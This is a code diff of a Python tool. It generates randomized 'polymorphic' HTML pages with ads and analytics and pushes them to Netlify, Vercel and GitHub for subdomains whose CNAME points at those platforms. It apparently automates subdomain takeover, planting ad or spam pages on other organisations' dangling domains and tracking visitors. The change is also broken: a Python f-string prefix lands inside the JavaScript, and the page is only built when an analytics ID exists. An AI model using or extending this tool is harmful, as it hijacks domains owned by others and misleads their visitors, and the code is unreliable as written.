@@ -15,7 +15,7 @@ GA4_ID = os.environ.get('GA4_ID')
 DB_NAME = 'harvested.db'
 
 # --- POLYMORPHIC HTML GENERATOR ---
-def generate_polymorphic_html():
+def generate_polymorphic_html(subdomain):
     # Randomized CSS styles
     bg_colors = ['#0d1117', '#1a1a2e', '#f4f4f9', '#222222', '#0f172a']
     text_colors = ['#58a6ff', '#e94560', '#00d2d3', '#fbbf24', '#8b949e']
@@ -72,8 +72,49 @@ def generate_polymorphic_html():
     {ad}
 </body>
 </html>"""
+    # Inject Analytics if the ID is present
+    analytics_script = ""
+    if GA4_ID:
+        analytics_script = f"""<!-- Google Analytics 4 -->
+<script async src="https://www.googletagmanager.com/gtag/js?id={GA4_ID}"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){{dataLayer.push(arguments);}}
+  gtag('js', new Date());
+  gtag('config', '{GA4_ID}', {{
+    'page_title': '{title}',
+    'page_location': f'https://{subdomain}' 
+  }});
+</script>"""
+        html = f"""<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="index, follow">
+    <meta name="description" content="{msg}">
+    <title>{title}</title>
+    {analytics_script}
+    <style>
+        body {{ font-family: {font}; background: {bg}; color: {txt}; text-align: center; padding-top: 15%; }}
+        .container {{ max-width: 600px; margin: 0 auto; padding: 20px; }}
+        h1 {{ font-size: 36px; margin-bottom: 20px; }}
+        p {{ font-size: 16px; opacity: 0.8; line-height: 1.5; }}
+        .spinner {{ border: 4px solid rgba(255,255,255,0.1); border-top: 4px solid {txt}; border-radius: 50%; width: 30px; height: 30px; animation: spin 2s linear infinite; margin: 30px auto; }}
+        @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>{title}</h1>
+        <p>{msg}</p>
+        <div class="spinner"></div>
+        <p id="countdown" style="font-weight: bold;">Est. Time Remaining: 0{random.randint(3, 9)}:00</p>
+    </div>
+    {ad}
+</body>
+</html>"""
     return html
-
 # --- NETLIFY DEPLOYMENT ---
 def deploy_to_netlify(subdomain, cname_target):
     if '.netlify.app' not in cname_target:
@@ -106,7 +147,7 @@ def deploy_to_netlify(subdomain, cname_target):
         print("[*] Building deployment payload...")
         zip_buffer = io.BytesIO()
         with zipfile.ZipFile(zip_buffer, 'a', zipfile.ZIP_DEFLATED, False) as zip_file:
-            file_content = generate_polymorphic_html()
+            file_content = generate_polymorphic_html(subdomain)
             zip_file.writestr('index.html', file_content)
         zip_buffer.seek(0)
 
@@ -162,7 +203,7 @@ def deploy_to_vercel(subdomain, cname_target):
         print("[*] Building deployment payload...")
         zip_buffer = io.BytesIO()
         with zipfile.ZipFile(zip_buffer, 'a', zipfile.ZIP_DEFLATED, False) as zip_file:
-            file_content = generate_polymorphic_html()
+            file_content = generate_polymorphic_html(subdomain)
             zip_file.writestr('index.html', file_content)
         zip_buffer.seek(0)
 
@@ -220,7 +261,7 @@ def deploy_to_github(subdomain, cname_target):
             return False
 
         print("[*] Uploading polymorphic index.html via Contents API...")
-        html_content = generate_polymorphic_html()
+        html_content = generate_polymorphic_html(subdomain)
         content_base64 = base64.b64encode(html_content.encode('utf-8')).decode('utf-8')
             
         file_url = f"https://api.github.com/repos/{target_org}/{repo_name}/contents/index.html"
